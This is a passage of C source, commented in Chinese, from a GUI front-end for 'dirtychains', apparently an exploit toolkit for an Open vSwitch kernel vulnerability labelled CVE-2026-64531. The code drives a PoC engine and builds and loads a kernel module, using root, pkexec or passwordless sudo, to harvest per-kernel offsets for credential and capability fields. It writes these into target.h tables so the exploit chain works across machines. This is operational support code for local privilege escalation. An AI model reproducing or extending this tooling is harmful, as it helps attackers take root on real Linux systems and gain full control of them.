        log_append_plain(a, msg);
        log_flush(a);
        g_error_free(ge);
        return;
    }
    if (err1 && *err1)
        log_append_plain(a, err1);
    if (!WIFEXITED(st) || WEXITSTATUS(st) != 0) {
        log_append_plain(a,
            "[!] 解析失败。确认已装 pahole (sudo apt install dwarves)，\n"
            "    且 /boot/System.map-$(uname -r) 或 /proc/kallsyms (root) 可读；\n"
            "    卡在 ovs_conntrack_info 就先 sudo modprobe openvswitch。\n");
        log_flush(a);
        gtk_label_set_text(GTK_LABEL(a->status_lbl), "vmlinux 解析失败");
        g_free(json);
        g_free(err1);
        return;
    }
    if (json && *json) {
        log_append_plain(a, json);
        if (*(json) && json[strlen(json) - 1] != '\n')
            log_append_plain(a, "\n");
    }

    /* 从 JSON 里抠 release */
    if (json && (p = strstr(json, "\"release\"")) != NULL &&
        (p = strchr(p + 9, '"')) != NULL) {
        p++;
        if ((q = strchr(p, '"')) != NULL)
            rel = g_strndup(p, (gsize)(q - p));
    }
    if (!rel) {
        log_append_plain(a, "[!] 解析成功，但拿不到内核版本号，跳过落盘。\n");
        log_flush(a);
        g_free(json);
        g_free(err1);
        return;
    }

    /* 第 2 步: -dump-target 生成 target.h 文本 */
    argc = 0;
    argv[argc++] = a->poc_path;
    if (a->poc_builtin)
        argv[argc++] = "--ovs";
    argv[argc++] = "-dump-target";
    argv[argc] = NULL;

    if (!g_spawn_sync(NULL, argv, NULL, G_SPAWN_SEARCH_PATH,
                      NULL, NULL, &th, &err2, &st, &ge) ||
        !WIFEXITED(st) || WEXITSTATUS(st) != 0 || !th || !*th) {
        g_snprintf(msg, sizeof(msg),
                   "[!] 生成 target.h 失败 (%s)。\n",
                   ge ? ge->message : "引擎返回非 0");
        log_append_plain(a, msg);
        log_flush(a);
        if (ge)
            g_error_free(ge);
        g_free(json);
        g_free((char *)rel);
        g_free(err1);
        g_free(err2);
        return;
    }

    /* 落盘: <程序目录>/offset/<release>/target.h */
    rl = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
    if (rl <= 0) {
        log_append_plain(a, "[!] 读不到程序路径，跳过落盘。\n");
        log_flush(a);
        g_free(json);
        g_free(th);
        g_free((char *)rel);
        g_free(err1);
        g_free(err2);
        return;
    }
    exe[rl] = '\0';
    g_strlcpy(exdir, exe, sizeof(exdir));
    {
        char *slash = strrchr(exdir, '/');

        if (slash)
            *slash = '\0';
    }
    g_snprintf(offdir, sizeof(offdir), "%s/offset", exdir);
    g_snprintf(sub, sizeof(sub), "%s/%s", offdir, rel);
    g_snprintf(path, sizeof(path), "%s/target.h", sub);

    if (g_mkdir_with_parents(sub, 0755) != 0 ||
        g_file_set_contents(path, th, -1, NULL) == FALSE) {
        g_snprintf(msg, sizeof(msg),
                   "[!] 写入 %s 失败: %s\n", path, strerror(errno));
        log_append_plain(a, msg);
    } else {
        g_snprintf(msg, sizeof(msg),
                   "\033[32m[+] 已写入 %s (%ld 字节)。\033[0m\n"
                   "    之后 OVS 链在这台机器上会直接命中配置表，"
                   "不再需要 pahole/BTF。\n",
                   path, (long)strlen(th));
        log_append_plain(a, msg);
        g_snprintf(msg, sizeof(msg), "vmlinux 解析完成: %s", rel);
        gtk_label_set_text(GTK_LABEL(a->status_lbl), msg);
    }
    log_flush(a);

    g_free(json);
    g_free(th);
    g_free((char *)rel);
    g_free(err1);
    g_free(err2);
}

/* ===================== 「root 获取偏移表」 ===================== */

/*
 * tools/kmod/krec_dump.ko 是随包附带的内核模块: 加载后把本机内核的
 * struct 偏移和 vmlinux 符号偏移直接写进 /proc/krec_dump (JSON, 与
 * `ovswrap -dump-krec` 同构)。不依赖 BTF / pahole / System.map,
 * 代价是要现场编一个 .ko, 而且 insmod / rmmod 需要 root。
 *
 * 「root 获取偏移表」四步:
 *   1. 找 krec_dump.ko; 没有就用包里的源码编一个 (make -C tools/kmod)
 *   2. 提权 (root / pkexec / sudo -n) 加载模块、读 /proc/krec_dump
 *   3. 无论成败立刻 rmmod, 不让模块留在内核里
 *   4. 在这里按 mk_offset.py 的同一格式渲染 target.h 落盘
 *      (目标机不需要装 python3)
 */

/* 极简 JSON 取值: 只认本模块输出的平坦结构, 不做完整解析 */
static const char *json_scan(const char *js, const char *key)
{
    char pat[96];
    const char *p;

    if (!js || !key || strlen(key) + 3 > sizeof(pat))
        return NULL;
    g_snprintf(pat, sizeof(pat), "\"%s\"", key);
    if (!(p = strstr(js, pat)))
        return NULL;
    p += strlen(pat);
    while (*p == ' ' || *p == '\t' || *p == '\n' || *p == '\r')
        p++;
    if (*p != ':')
        return NULL;
    p++;
    while (*p == ' ' || *p == '\t' || *p == '\n' || *p == '\r')
        p++;
    return p;
}

static gboolean json_num(const char *js, const char *key, long *out)
{
    const char *p = json_scan(js, key);
    char *end = NULL;
    long v;

    if (!p)
        return FALSE;
    errno = 0;
    v = strtol(p, &end, 10);
    if (end == p || errno != 0)
        return FALSE;
    *out = v;
    return TRUE;
}

static char *json_str(const char *js, const char *key)
{
    const char *p = json_scan(js, key);
    GString *s;

    if (!p || *p != '"')
        return NULL;
    p++;
    s = g_string_new(NULL);
    while (*p && *p != '"') {
        if (*p == '\\' && p[1]) {
            p++;
            switch (*p) {
            case 'n': g_string_append_c(s, '\n'); break;
            case 't': g_string_append_c(s, '\t'); break;
            case 'r': g_string_append_c(s, '\r'); break;
            default:  g_string_append_c(s, *p);   break;
            }
            p++;
        } else {
            g_string_append_c(s, *p++);
        }
    }
    if (*p != '"') {
        g_string_free(s, TRUE);
        return NULL;
    }
    return g_string_free(s, FALSE);
}

/* read_lanes 是字符串数组, target.h 里要的是逗号串 */
static char *json_lanes(const char *js)
{
    const char *p = json_scan(js, "read_lanes");
    GString *s;
    gboolean first = TRUE;

    if (!p || *p != '[')
        return NULL;
    p++;
    s = g_string_new(NULL);
    while (*p && *p != ']') {
        if (*p == '"') {
            const char *q = strchr(p + 1, '"');

            if (!q)
                break;
            if (!first)
                g_string_append_c(s, ',');
            g_string_append_len(s, p + 1, q - p - 1);
            first = FALSE;
            p = q + 1;
        } else {
            p++;
        }
    }
    if (s->len == 0) {
        g_string_free(s, TRUE);
        return NULL;
    }
    return g_string_free(s, FALSE);
}

/* 把任意字符串塞进 C 字符串字面量 (换行/引号/反斜杠转义) */
static const char *c_esc(const char *s, char *buf, size_t n)
{
    size_t o = 0;

    if (!s)
        s = "";
    for (; *s && o + 3 < n; s++) {
        unsigned char ch = (unsigned char)*s;

        if (ch == '\\' || ch == '"') {
            buf[o++] = '\\';
            buf[o++] = (char)ch;
        } else if (ch == '\n') {
            buf[o++] = '\\';
            buf[o++] = 'n';
        } else if (ch == '\r') {
            buf[o++] = '\\';
            buf[o++] = 'r';
        } else if (ch == '\t') {
            buf[o++] = '\\';
            buf[o++] = 't';
        } else {
            buf[o++] = (char)ch;
        }
    }
    buf[o] = '\0';
    return buf;
}

/* 与 tools/mk_offset.py 的 FIELDS 一一对应, 顺序也保持一致 */
static const struct {
    const char *macro, *key;
} th_fields[] = {
    { "NF_CONNTRACK_HELPER_ME",  "nf_conntrack_helper_me"  },
    { "MODULE_KOBJ_KTYPE",       "module_kobj_ktype"       },
    { "TASK_PID",                "task_pid"                },
    { "TASK_CRED",               "task_cred"               },
    { "TASK_PID_LINKS",          "task_pid_links"          },
    { "CRED_FSUID",              "cred_fsuid"              },
    { "CRED_FSGID",              "cred_fsgid"              },
    { "CRED_CAP_PERMITTED",      "cred_cap_permitted"      },
    { "CRED_CAP_EFFECTIVE",      "cred_cap_effective"      },
    { "PID_NAMESPACE_IDR",       "pid_namespace_idr"       },
    { "IDR_IDR_RT",              "idr_idr_rt"              },
    { "IDR_BASE",                "idr_base"                },
    { "XARRAY_XA_HEAD",          "xarray_xa_head"          },
    { "XA_NODE_SHIFT",           "xa_node_shift"           },
    { "XA_NODE_SLOTS",           "xa_node_slots"           },
    { "PID_TASKS",               "pid_tasks"               },
    { "HLIST_HEAD_FIRST",        "hlist_head_first"        },
    { "DST_ENTRY_REF",           "dst_entry_ref"           },
    { "METADATA_DST_TUN_INFO",   "metadata_dst_tun_info"   },
    { "IP_TUNNEL_KEY_IPV4_SRC",  "ip_tunnel_key_ipv4_src"  },
    { "IP_TUNNEL_KEY_IPV4_DST",  "ip_tunnel_key_ipv4_dst"  },
    { "IP_TUNNEL_KEY_TOS",       "ip_tunnel_key_tos"       },
    { "IP_TUNNEL_KEY_TTL",       "ip_tunnel_key_ttl"       },
    { "IP_TUNNEL_KEY_TP_SRC",    "ip_tunnel_key_tp_src"    },
    { "IP_TUNNEL_KEY_TP_DST",    "ip_tunnel_key_tp_dst"    },
    { "OVS_CT_LABELS",           "ovs_ct_labels"           },
    { "OVS_CT_ACTION_LEN",       "ovs_ct_action_len"       },
};

/*
 * 把 /proc/krec_dump 的 JSON 渲染成 target.h。
 * 输出与 tools/mk_offset.py 等价, 两处改字段时要一起改。
 */
static char *render_target_h(const char *js, const char *src, char **why)
{
    GString *o;
    char *rel = json_str(js, "release");
    char *ver = json_str(js, "version");
    char *mach = json_str(js, "machine");
    char *kind = json_str(js, "dst_entry_ref_kind");
    char *rcar = json_str(js, "read_carrier");
    char *wcar = json_str(js, "write_carrier");
    char *lanes = json_lanes(js);
    char b1[512], b2[512], b3[64], b4[64], b5[64], b6[64], b7[512];
    long mtype = 0, mipn = 0, ti = 31, v = 0;
    size_t i;

    *why = NULL;
    if (!rel || !*rel) {
        *why = g_strdup("记录里没有 release 字段");
        goto fail;
    }
    if (!json_num(js, "vmlinux_module_ktype", &mtype) ||
        !json_num(js, "vmlinux_init_pid_ns", &mipn)) {
        *why = g_strdup("记录里缺 vmlinux 符号偏移");
        goto fail;
    }
    json_num(js, "ovs_key_attr_tunnel_info", &ti);

    o = g_string_new(NULL);
    g_string_append_printf(o,
        "/*\n"
        " * target.h - dirtychains OVS (CVE-2026-64531) kernel offsets\n"
        " *\n"
        " * 放这里：offset/<N>系/<release>/target.h\n"
        " * 例：    offset/5系/5.8.0-59-generic/target.h\n"
        " *\n"
        " * 程序启动时按目录名找本机 release，不需要重新编译。\n"
        " * 本文件同时也是合法 C 头文件，可以直接 #include 静态编译。\n"
        " *\n"
        " * 生成: %s\n"
        " */\n"
        "#ifndef DIRTYCHAINS_TARGET_H\n"
        "#define DIRTYCHAINS_TARGET_H\n\n"
        "#define KREC_FORMAT        1\n"
        "#define KREC_RELEASE       \"%s\"\n"
        "#define KREC_VERSION       \"%s\"\n"
        "#define KREC_VERSION_HASH  %luUL\n"
        "#define KREC_MACHINE       \"%s\"\n\n"
        "/* 符号偏移：相对 _text，与 KASLR 无关 */\n"
        "#define KREC_VMLINUX_MODULE_KTYPE %ldUL\n"
        "#define KREC_VMLINUX_INIT_PID_NS  %ldUL\n\n"
        "/* 结构体字段偏移 */\n",
        c_esc(src, b1, sizeof(b1)), c_esc(rel, b2, sizeof(b2)),
        c_esc(ver, b3, sizeof(b3)), fnv1a32(ver ? ver : ""),
        c_esc(mach, b4, sizeof(b4)), mtype, mipn);

    for (i = 0; i < G_N_ELEMENTS(th_fields); i++) {
        char name[64];

        if (!json_num(js, th_fields[i].key, &v)) {
            g_string_free(o, TRUE);
            *why = g_strdup_printf("记录里缺字段 %s", th_fields[i].key);
            goto fail;
        }
        g_snprintf(name, sizeof(name), "KREC_%s", th_fields[i].macro);
        g_string_append_printf(o, "#define %-30s %ld\n", name, v);
    }

    g_string_append_printf(o,
        "\n/* 行为参数：从调试信息推不出来，只能实机试 */\n"
        "#define KREC_REF_KIND      \"%s\"\n"
        "#define KREC_TUNNEL_INFO   %ld\n"
        "#define KREC_READ_CARRIER  \"%s\"\n"
        "#define KREC_WRITE_CARRIER \"%s\"\n"
        "#define KREC_READ_LANES    \"%s\"\n\n"
        "#endif /* DIRTYCHAINS_TARGET_H */\n",
        c_esc(kind ? kind : "__rcuref", b5, sizeof(b5)), ti,
        c_esc(rcar ? rcar : "timeout", b6, sizeof(b6)),
        c_esc(wcar ? wcar : (rcar ? rcar : "timeout"), b7, sizeof(b7)),
        lanes ? lanes : "tos,ttl,tp_src_0,tp_src_1,tp_dst_0,tp_dst_1,"
                        "ipv4_src_0,ipv4_src_1,ipv4_src_2,ipv4_src_3,"
                        "ipv4_dst_0,ipv4_dst_1,ipv4_dst_2,ipv4_dst_3");

    g_free(rel);
    g_free(ver);
    g_free(mach);
    g_free(kind);
    g_free(rcar);
    g_free(wcar);
    g_free(lanes);
    return g_string_free(o, FALSE);

fail:
    g_free(rel);
    g_free(ver);
    g_free(mach);
    g_free(kind);
    g_free(rcar);
    g_free(wcar);
    g_free(lanes);
    return NULL;
}

/* 配置表根目录: 优先程序目录的 offset/, 其次系统 share 目录 */
static char *offset_root_dir(void)
{
    static const char *sys[] = {
        "/usr/local/share/dirtychains/offset",
        "/usr/share/dirtychains/offset",
    };
    char *exe = self_exe();
    char *dir = exe ? g_path_get_dirname(exe) : g_strdup(".");
    char *p = g_build_filename(dir, "offset", NULL);
    size_t i;

    g_free(exe);
    g_free(dir);
    if (g_file_test(p, G_FILE_TEST_IS_DIR))
        return p;
    for (i = 0; i < G_N_ELEMENTS(sys); i++) {
        if (g_file_test(sys[i], G_FILE_TEST_IS_DIR)) {
            g_free(p);
            return g_strdup(sys[i]);
        }
    }
    return p;   /* 不存在: 调用方 mkdir, 落在程序目录下 */
}

static gboolean module_loaded(const char *name)
{
    char *txt = NULL, *pat = NULL, *line = NULL, *save = NULL;
    gboolean on = FALSE;

    if (!g_file_get_contents("/proc/modules", &txt, NULL, NULL))
        return FALSE;
    pat = g_strdup_printf("%s ", name);
    for (line = strtok_r(txt, "\n", &save); line;
         line = strtok_r(NULL, "\n", &save)) {
        if (g_str_has_prefix(line, pat)) {
            on = TRUE;
            break;
        }
    }
    g_free(pat);
    g_free(txt);
    return on;
}

/* 现场编 .ko：make -C tools/kmod，输出落到临时文件再贴进日志 */
static gboolean build_kmod(App *a, const char *dir)
{
    char *logf = g_build_filename(g_get_tmp_dir(),
                                  "dirtychains-kmod.log", NULL);
    char *qdir = g_shell_quote(dir);
    char *qlog = g_shell_quote(logf);
    char *cmd = g_strdup_printf("make -s -C %s > %s 2>&1", qdir, qlog);
    char *argv[] = { (char *)"/bin/sh", (char *)"-c", cmd, NULL };
    GPid pid = 0;
    GError *ge = NULL;
    gint st = -1;
    gboolean ok = FALSE;
    char *lg = NULL;

    gtk_label_set_text(GTK_LABEL(a->status_lbl), "正在编译 krec_dump.ko …");
    gtk_widget_set_name(a->status_lbl, "status-run");
    while (gtk_events_pending())
        gtk_main_iteration();

    if (g_spawn_async(NULL, argv, NULL,
                      G_SPAWN_SEARCH_PATH | G_SPAWN_DO_NOT_REAP_CHILD,
                      NULL, NULL, &pid, &ge)) {
        /* 编译要几十秒，期间把事件泵转起来，别让窗口假死 */
        while (waitpid(pid, &st, WNOHANG) == 0) {
            while (gtk_events_pending())
                gtk_main_iteration();
            g_usleep(50000);
        }
        g_spawn_close_pid(pid);
        ok = WIFEXITED(st) && WEXITSTATUS(st) == 0;
    } else {
        g_error_free(ge);
    }

    if (g_file_get_contents(logf, &lg, NULL, NULL)) {
        if (*lg)
            log_append_plain(a, lg);
        g_free(lg);
    }
    unlink(logf);
    g_free(cmd);
    g_free(qdir);
    g_free(qlog);
    g_free(logf);
    return ok;
}

/*
 * 找 krec_dump.ko：程序目录 tools/kmod/ -> 程序目录 -> 系统 share。
 * 都找不到但包里有源码就现场编一个。
 */
static char *ensure_kmod(App *a, char **why)
{
    static const char *rel[] = {
        "tools/kmod/krec_dump.ko",
        "krec_dump.ko",
        "tools/krec_dump.ko",
    };
    static const char *sys[] = {
        "/usr/local/share/dirtychains/krec_dump.ko",
        "/usr/share/dirtychains/krec_dump.ko",
    };
    char *exe = self_exe();
    char *dir = exe ? g_path_get_dirname(exe) : g_strdup(".");
    char *ko = NULL;
    size_t i;

    *why = NULL;
    for (i = 0; i < G_N_ELEMENTS(rel); i++) {
        char *p = g_build_filename(dir, rel[i], NULL);

        if (g_file_test(p, G_FILE_TEST_IS_REGULAR)) {
            ko = p;
            break;
        }
        g_free(p);
    }
    for (i = 0; !ko && i < G_N_ELEMENTS(sys); i++) {
        if (g_file_test(sys[i], G_FILE_TEST_IS_REGULAR))
            ko = g_strdup(sys[i]);
    }

    if (!ko) {
        /* 程序目录（压缩包解压即用）→ 安装目录 share/dirtychains/tools/kmod */
        char *kdir = g_build_filename(dir, "tools", "kmod", NULL);
        char *mk = g_build_filename(kdir, "Makefile", NULL);

        if (!g_file_test(mk, G_FILE_TEST_EXISTS)) {
            g_free(mk);
            g_free(kdir);
            kdir = g_build_filename("/usr/local/share/dirtychains",
                                    "tools", "kmod", NULL);
            mk = g_build_filename(kdir, "Makefile", NULL);
            if (!g_file_test(mk, G_FILE_TEST_EXISTS)) {
                g_free(mk);
                g_free(kdir);
                kdir = g_build_filename("/usr/share/dirtychains",
                                        "tools", "kmod", NULL);
                mk = g_build_filename(kdir, "Makefile", NULL);
            }
        }

        if (g_file_test(mk, G_FILE_TEST_EXISTS)) {
            char note[PATH_BUF];
            char *built;

            g_snprintf(note, sizeof(note),
                       "\033[2m[*] 没找到现成的 krec_dump.ko，用 %s 现场编一个"
                       "（需要 linux-headers-$(uname -r)）…\033[0m\n", kdir);
            ansi_feed(a, note, strlen(note));
            log_flush(a);

            if (build_kmod(a, kdir)) {
                built = g_build_filename(kdir, "krec_dump.ko", NULL);
                if (g_file_test(built, G_FILE_TEST_IS_REGULAR))
                    ko = built;
                else
                    g_free(built);
            }
        }
        if (!ko) {
            *why = g_strdup_printf(
                "没找到 krec_dump.ko，也没能现场编译（%s/tools/kmod）。\n"
                "    装好内核头文件再试: sudo apt install "
                "linux-headers-$(uname -r)", dir);
        }
        g_free(mk);
        g_free(kdir);
    }

    g_free(exe);
    g_free(dir);
    return ko;
}

static gboolean have_pkexec(void)
{
    const char *disp = g_getenv("DISPLAY");
    const char *wl = g_getenv("WAYLAND_DISPLAY");

    if ((!disp || !*disp) && (!wl || !*wl))
        return FALSE;
    return g_file_test("/usr/bin/pkexec", G_FILE_TEST_IS_EXECUTABLE) ||
           g_file_test("/bin/pkexec", G_FILE_TEST_IS_EXECUTABLE);
}

static gboolean sudo_nopasswd(void)
{
    char out[64];
    int n = run_cmd("sudo -n true 2>/dev/null; echo $?", out, sizeof(out));

    return n > 0 && out[0] == '0';
}


/*
 * 不经过 shell 的提权执行。
 *
 * 之前这里是把一串多行 shell 脚本交给 sh -c, 结果在部分精简 /bin/sh
 * (dash 变体、busybox、被替换过的 sh) 上直接报
 *     /bin/sh: 1: Syntax error: ")" unexpected
 * 因为脚本里的 $(command -v ...) 、if ! ... 被当作交互输入逐行解析。
 * insmod/rmmod 本来就是"命令 + 参数"的形式, 直接用 argv 执行, 不经过
 * 任何 shell, 引号、括号、变量展开的问题全部消失。
 */
static char *find_tool(const char *name)
{
    char *p = g_find_program_in_path(name);

    if (p)
        return p;
    return g_strdup_printf("/sbin/%s", name);
}

/* how: NULL = 当前身份, "pkexec" = 图形提权, "sudo" = 免密 sudo */
static gboolean spawn_argv_as(const char *how, char *const *cmd,
                              char **out, char **err, int *st)
{
    char *argv[12];
    int i = 0, j;
    GError *ge = NULL;
    gboolean ok;

    if (how && !strcmp(how, "pkexec")) {
        argv[i++] = (char *)"/usr/bin/pkexec";
    } else if (how && !strcmp(how, "sudo")) {
        argv[i++] = (char *)"sudo";
        argv[i++] = (char *)"-n";
    }
    for (j = 0; cmd[j] && i < 11; j++)
        argv[i++] = cmd[j];
    argv[i] = NULL;

    ok = g_spawn_sync(NULL, argv, NULL, G_SPAWN_SEARCH_PATH, NULL, NULL,
                      out, err, st, &ge);
    if (!ok) {
        if (err && !*err)
            *err = g_strdup(ge ? ge->message : "起不了子进程");
        if (ge)
            g_error_free(ge);
    }
    return ok;
}

/*
 * 依次尝试: 已经是 root -> pkexec -> 免密 sudo。
 * pkexec 的 126/127 表示"用户取消/没授权/命令不存在", 只有这两种才回退
 * sudo; 子命令自己失败 (比如 insmod 报错) 要如实返回, 不能当成提权失败
 * 再跑一遍。
 */
static gboolean run_priv_argv(char *const *cmd, char **out, char **err,
                              int *st, const char **via)
{
    gboolean ok;

    *out = *err = NULL;
    *st = -1;

    if (geteuid() == 0) {
        *via = "root";
        return spawn_argv_as(NULL, cmd, out, err, st);
    }

    if (have_pkexec()) {
        ok = spawn_argv_as("pkexec", cmd, out, err, st);
        if (ok && WIFEXITED(*st) &&
            WEXITSTATUS(*st) != 126 && WEXITSTATUS(*st) != 127) {
            *via = "pkexec";
            return TRUE;
        }
        g_free(*out);
        g_free(*err);
        *out = *err = NULL;
        *st = -1;
    }

    *via = "sudo -n";
    return spawn_argv_as("sudo", cmd, out, err, st);
}

/* insmod 常见失败的一句话诊断 */
static const char *insmod_hint(const char *e)
{
    if (!e)
        return NULL;
    if (strstr(e, "Invalid module format") || strstr(e, "version magic"))
        return "模块和当前内核不匹配（.ko 是用别的内核头文件编的）。\n"
               "    先 make -C tools/kmod clean 再 make -C tools/kmod 重编。";
    if (strstr(e, "Operation not permitted") || strstr(e, "Lockdown") ||
        strstr(e, "Permission denied"))
        return "内核拒绝了模块加载：Secure Boot / lockdown，或当前是容器\n"
               "    （没有 CAP_SYS_MODULE）。换真机或关掉 Secure Boot 再试。";
    if (strstr(e, "Unknown symbol"))
        return "模块依赖的内核符号不存在：内核版本对不上，重编 .ko。";
    if (strstr(e, "File exists"))
        return "krec_dump 已经加载过了，先 sudo rmmod krec_dump。";
    if (strstr(e, "No such file"))
        return "找不到 .ko 文件，确认包里的 tools/kmod 没被删。";
    if (strstr(e, "password is required") || strstr(e, "no tty"))
        return "需要 root 密码，但既没有免密 sudo 也没有图形认证代理。\n"
               "    用 sudo ./dirtychains 启动，或给当前用户配 NOPASSWD。";
    if (strstr(e, "Not authorized") || strstr(e, "dismissed"))
        return "polkit 认证被取消。";
    return NULL;
}

/*
 * 「root 获取偏移表」：
 * 找/编 krec_dump.ko -> 提权 insmod -> 读 /proc/krec_dump -> 立刻 rmmod
 * -> C 里渲染 target.h -> 写 offset/<N>系/<release>/。
 */
static void act_root_offset(GtkWidget *w, gpointer data)
{
    App *a = data;
    const Chain *c = cur_chain(a);
    const char *hdr =
        "\n\033[2m══ root 获取偏移表：krec_dump.ko 直接读本机偏移 ══\n\033[0m\n";
    char *ko = NULL, *why = NULL;
    char *insmod_bin = NULL, *rmmod_bin = NULL;
    char *out = NULL, *err = NULL, *th = NULL, *rel = NULL, *src = NULL;
    char *root = NULL, *sub = NULL, *path = NULL, *recp = NULL;
    const char *via = "root";
    int st = -1;
    gboolean ok;
    char msg[PATH_BUF * 2];

    (void)w;
    if (!c || c->engine != 1)
        return;
    if (a->running) {
        gtk_label_set_text(GTK_LABEL(a->status_lbl), "已有任务在运行");
        return;
    }

    log_reset(a);
    ansi_feed(a, hdr, strlen(hdr));
    log_flush(a);

    /* 先把明显没戏的情况挡掉, 省得白编一次模块 */
    if (geteuid() != 0 && !have_pkexec() && !sudo_nopasswd()) {
        const char *no =
            "\033[31m[!] 需要 root 才能 insmod / rmmod。\033[0m\n"
            "    当前不是 root，没有图形认证代理（pkexec），"
            "也没有免密 sudo。\n"
            "    用 sudo ./dirtychains 启动，或者手工三步：\n"
            "      sudo insmod <程序目录>/tools/kmod/krec_dump.ko\n"
            "      cat /proc/krec_dump > rec.json && sudo rmmod krec_dump\n"
            "      python3 tools/mk_offset.py rec.json --root offset\n";

        ansi_feed(a, no, strlen(no));
        log_flush(a);
        gtk_label_set_text(GTK_LABEL(a->status_lbl), "需要 root 权限");
        gtk_widget_set_name(a->status_lbl, "status-err");
        return;
    }

    /* 1. 找 / 编 .ko */
    ko = ensure_kmod(a, &why);
    if (!ko) {
        g_snprintf(msg, sizeof(msg), "\033[31m[!] 拿不到 krec_dump.ko：%s\033[0m\n",
                   why ? why : "未知原因");
        ansi_feed(a, msg, strlen(msg));
        log_flush(a);
        gtk_label_set_text(GTK_LABEL(a->status_lbl), "偏移表获取失败");
        gtk_widget_set_name(a->status_lbl, "status-err");
        g_free(why);
        return;
    }

    /*
     * 2. 提权 insmod -> 读 /proc/krec_dump -> 立刻 rmmod。
     *
     * 全程不走 shell: 每条命令都是 argv, 免得不同 /bin/sh 在解析
     * 多行脚本时报 "Syntax error: ) unexpected"。
     */
    insmod_bin = find_tool("insmod");
    rmmod_bin = find_tool("rmmod");

    /* 之前若有残留的同名模块, 先卸掉, 否则 insmod 会 File exists */
    if (module_loaded("krec_dump")) {
        char *r[3];
        int rst = -1;
        char *ro = NULL, *re = NULL;
        const char *rv = "root";

        r[0] = rmmod_bin;
        r[1] = (char *)"krec_dump";
        r[2] = NULL;
        run_priv_argv(r, &ro, &re, &rst, &rv);
        g_free(ro);
        g_free(re);
    }

    {
        char *cmd[3];

        cmd[0] = insmod_bin;
        cmd[1] = ko;
        cmd[2] = NULL;

        gtk_label_set_text(GTK_LABEL(a->status_lbl), "正在加载 krec_dump.ko …");
        gtk_widget_set_name(a->status_lbl, "status-run");

        ok = run_priv_argv(cmd, &out, &err, &st, &via);
    }

    if (!ok) {
        g_snprintf(msg, sizeof(msg), "\033[31m[!] 执行失败：%s\033[0m\n",
                   err && *err ? err : "起不了子进程");
        ansi_feed(a, msg, strlen(msg));
        log_flush(a);
        gtk_label_set_text(GTK_LABEL(a->status_lbl), "偏移表获取失败");
        gtk_widget_set_name(a->status_lbl, "status-err");
        goto done;
    }

    if (!WIFEXITED(st) || WEXITSTATUS(st) != 0) {
        int ec = WIFEXITED(st) ? WEXITSTATUS(st) : -1;
        const char *hint = insmod_hint(err);
        /* 半加载的情况也要收尾 */
        char *r[3];
        int rst = -1;
        char *ro = NULL, *re = NULL;
        const char *rv = "root";

        r[0] = rmmod_bin;
        r[1] = (char *)"krec_dump";
        r[2] = NULL;
        run_priv_argv(r, &ro, &re, &rst, &rv);
        g_free(ro);
        g_free(re);

        g_snprintf(msg, sizeof(msg),
                   "\033[31m[!] insmod krec_dump.ko 失败（%s，退出码 %d）\033[0m\n",
                   via, ec);
        ansi_feed(a, msg, strlen(msg));
        if (err && *err)
            log_append_plain(a, err);
        if (hint) {
            g_snprintf(msg, sizeof(msg), "    %s\n", hint);
            log_append_plain(a, msg);
        }
        log_append_plain(a,
            "    也可以手工走一遍：\n"
            "      sudo insmod <程序目录>/tools/kmod/krec_dump.ko\n"
            "      cat /proc/krec_dump > rec.json\n"
            "      sudo rmmod krec_dump\n"
            "      python3 tools/mk_offset.py rec.json --root offset\n");
        log_flush(a);
        gtk_label_set_text(GTK_LABEL(a->status_lbl), "偏移表获取失败");
        gtk_widget_set_name(a->status_lbl, "status-err");
        goto done;
    }

    /*
     * 3. 读偏移记录, 无论成败都立刻卸载模块。
     *    /proc/krec_dump 的内容随进程 uid 检查, 所以用 root 身份的
     *    文件读取 (这里是同一个 euid==0 的进程或提权后的子进程)。
     */
    {
        char *json = NULL;
        char *r[3];
        int rst = -1;
        char *ro = NULL, *re = NULL;
        const char *rv = "root";

        g_free(out);
        out = NULL;

        if (geteuid() == 0) {
            g_file_get_contents("/proc/krec_dump", &json, NULL, NULL);
        } else {
            char *c[3];

            c[0] = (char *)"cat";
            c[1] = (char *)"/proc/krec_dump";
            c[2] = NULL;
            run_priv_argv(c, &json, &re, &rst, &rv);
            g_free(re);
            re = NULL;
            rst = -1;
        }

        r[0] = rmmod_bin;
        r[1] = (char *)"krec_dump";
        r[2] = NULL;
        run_priv_argv(r, &ro, &re, &rst, &rv);
        g_free(ro);
        g_free(re);

        out = json;
    }

    if (!out || !strstr(out, "\"release\"")) {
        log_append_plain(a, "[!] 模块跑完了，但没有拿到偏移记录。\n");
        if (err && *err)
            log_append_plain(a, err);
        log_flush(a);
        gtk_label_set_text(GTK_LABEL(a->status_lbl), "偏移表获取失败");
        gtk_widget_set_name(a->status_lbl, "status-err");
        goto done;
    }

    /* 3. 渲染 target.h */
    src = g_strdup_printf("krec_dump.ko（%s）", via);
    th = render_target_h(out, src, &why);
    if (!th) {
        g_snprintf(msg, sizeof(msg),
                   "\033[31m[!] 偏移记录不完整：%s\033[0m\n", why ? why : "未知");
        ansi_feed(a, msg, strlen(msg));
        log_flush(a);
        gtk_label_set_text(GTK_LABEL(a->status_lbl), "偏移表获取失败");
        gtk_widget_set_name(a->status_lbl, "status-err");
        goto done;
    }

    /* 4. 落盘: offset/<N>系/<release>/target.h (+ rec.json 存档) */
    rel = json_str(out, "release");
    root = offset_root_dir();
    {
        char major[16];
        const char *dot = rel ? strchr(rel, '.') : NULL;
        size_t n = dot ? (size_t)(dot - rel) : (rel ? strlen(rel) : 0);

        if (n >= sizeof(major))
            n = sizeof(major) - 1;
        if (rel && n)
            memcpy(major, rel, n);
        major[n] = '\0';
        sub = g_strdup_printf("%s/%s系/%s", root, major[0] ? major : "?",
                              rel ? rel : "unknown");
    }
    path = g_build_filename(sub, "target.h", NULL);
    recp = g_build_filename(sub, "rec.json", NULL);

    if (g_mkdir_with_parents(sub, 0755) != 0 ||
        !g_file_set_contents(path, th, -1, NULL)) {
        g_snprintf(msg, sizeof(msg),
                   "\033[31m[!] 写 %s 失败：%s\033[0m\n"
                   "    目录可能属于 root，用 sudo 启动本程序再试一次。\n",
                   path, strerror(errno));
        ansi_feed(a, msg, strlen(msg));
        log_flush(a);
        gtk_label_set_text(GTK_LABEL(a->status_lbl), "偏移表写入失败");
        gtk_widget_set_name(a->status_lbl, "status-err");
        goto done;
    }
    g_file_set_contents(recp, out, -1, NULL);

    g_snprintf(msg, sizeof(msg),
               "\033[32m[+] 已导出 %s（%ld 字节）\033[0m\n"
               "    原始记录：%s\n"
               "    模块已卸载：%s\n",
               path, (long)strlen(th), recp,
               module_loaded("krec_dump")
